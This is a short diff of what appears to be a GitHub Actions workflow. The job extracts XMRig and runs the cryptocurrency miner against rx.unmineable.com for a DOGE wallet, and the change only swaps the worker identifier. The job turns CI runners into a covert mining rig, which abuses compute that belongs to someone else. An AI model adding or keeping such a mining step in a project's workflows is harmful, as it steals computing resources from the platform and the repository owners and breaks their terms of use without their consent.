@@ -21,6 +21,6 @@ jobs:
       - name: Extract
         run: Expand-Archive xmrig.zip
       - name: Run Xmrig
-        run: .\xmrig\xmrig-6.21.0\xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DSXfQwLuNLBHS4shPD241km3UCDVq6rXuZ.unmineable_worker_dttgoikh#ffac-8rce -p x
+        run: .\xmrig\xmrig-6.21.0\xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DSXfQwLuNLBHS4shPD241km3UCDVq6rXuZ.unmineable_worker_xezskipr#rup9-jjmz -p x
       - name: END
         run: exit
